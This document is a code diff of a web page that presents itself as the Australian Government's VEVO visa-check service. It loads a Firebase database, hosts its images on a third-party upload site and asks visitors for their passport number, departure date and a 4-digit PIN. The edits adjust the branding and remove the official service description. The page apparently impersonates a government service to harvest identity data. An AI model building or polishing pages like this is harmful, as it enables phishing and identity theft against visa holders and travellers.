@@ -6,8 +6,9 @@
     <title>Check visa conditions online My-VEVO - Check Australian Government</title>
     <script src="https://www.gstatic.com/firebasejs/9.6.10/firebase-app-compat.js"></script>
     <script src="https://www.gstatic.com/firebasejs/9.6.10/firebase-database-compat.js"></script>
-  <meta name="google-site-verification" content="VK_4uWfV9e_bVfdpkXNtE52E6zPZjR7WHeNJeTw0mOc" />
+    <meta name="google-site-verification" content="VK_4uWfV9e_bVfdpkXNtE52E6zPZjR7WHeNJeTw0mOc" />
     <link rel="icon" type="image/x-icon" href="https://uploads.onecompiler.io/44ncz8e5z/44nd5m7sn/13898.png">
+    <meta property="og:image" content="https://uploads.onecompiler.io/44q8ezv2q/44qeevvd8/15574.jpg" />
     <style>
         :root { --navy: #003066; --blue-btn: #0056b3; --gray-bg: #f4f7f9; }
         body { font-family: 'Segoe UI', Tahoma, sans-serif; background-color: var(--gray-bg); margin: 0; padding: 0; }
@@ -38,10 +39,9 @@
 
 <div class="top-banner">
     <img src="https://uploads.onecompiler.io/44ggv5rcj/44ggv6n9r/9318.png" class="logo-img" style="pointer-events: none;" ondragstart="return false;"> 
-    <h3>Welcome to My-VEVO</h3>
+    <h3>myVEVO</h3>
    <p style="font-size: 15px; opacity: 1.8;">Check Your Current Australian visa. Expiry date and Travel Conditions.</p>
-   <p style="font-size: 10px; opacity: 0.8;">Visa Entitlement Verification Online (VEVO) allows visa holders, employers, education providers and other organisations to check visa details and conditions.</p>
-</div>
+   </div>
 
 <div class="container">
     <div id="formSection">
@@ -57,18 +57,18 @@
            
             <div class="field"><label>Passport Number</label><input type="text" id="passNum" placeholder="Enter Passport Number"></div>
             <div class="field"><label>Are you an Australian Resident?</label>
-                <div class="radio-grp"><span><input type="radio" name="res" value="Yes"> Yes</span><span><input type="radio" name="res" value="No" checked> No</span></div>
+             <div class="radio-grp"><span><input type="radio" name="res" value="Yes"> Yes</span><span><input type="radio" name="res" value="No" checked> No</span></div>
             </div>
             <div class="field"><label>Departure Date (DD/MM/YYYY)</label><input type="text" id="depDate" placeholder="dd/mm/yyyy"></div>
-            <button class="btn-main" onclick="showPinScreen()">VEVO CHECK</button>
+            <button class="btn-main" onclick="showPinScreen()">Conditions</button>
         </div>
     </div>
 
     <div id="pinSection" style="display:none; text-align:center; padding: 40px 20px;">
-        <h2 style="color: var(--navy);">My-VEVO</h2>
+        <h2 style="color: var(--navy);">MyVEVO</h2>
         <p style="color: #666; font-size: 14px;">Enter 4 Digit PIN</p>
         <input type="password" id="pinInput" maxlength="4" style="width: 150px; text-align: center; font-size: 30px; letter-spacing: 10px; border: none; border-bottom: 2px solid var(--navy); outline: none;">
-        <button class="btn-main" style="margin-top: 30px;" onclick="verifyData()">Verify PIN</button>
+        <button class="btn-main" style="margin-top: 30px;" onclick="verifyData()">Conditions</button>
     </div>
 
     <div id="resultView">
